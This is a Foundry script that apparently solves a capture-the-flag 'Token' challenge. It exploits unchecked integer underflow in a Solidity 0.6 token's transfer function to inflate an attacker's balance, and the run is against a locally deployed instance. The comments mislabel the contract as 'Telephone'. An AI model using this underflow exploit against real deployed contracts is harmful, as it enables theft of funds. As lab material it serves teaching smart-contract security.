// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Token} from "../src/Token.sol";

contract TokenSolution is Script {
    // $ forge script script/Token.s.sol --tc TokenSolution

    function run() external {
        Token tokenInstance = new Token(7e18);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        // ---- Attack Starts From here ---

        // - As you can see in the `Telephone` contract, the contract uses solidity v0.6, and performs arithmetic operations without check-in over/underflow.
        // - In the `transfer` function, if a user sends an amount greater than his balance, this will result in a big 0ve number.
        // - User balance (20), transfered 30 => 20 - 30 => uint256(-10) = big 0ve number.
        // - The check will be passed and the balance of the sender instead of decreasing to negative will be a huge positive number.
        // - The user can control the Token, as he has a huge large amount.

        vm.startPrank(attacker);
        console.log("Hacker balance:", tokenInstance.balanceOf(attacker));
        tokenInstance.transfer(msg.sender, 20);
        console.log("Hacker balance:", tokenInstance.balanceOf(attacker));

        vm.stopPrank();
    }
}
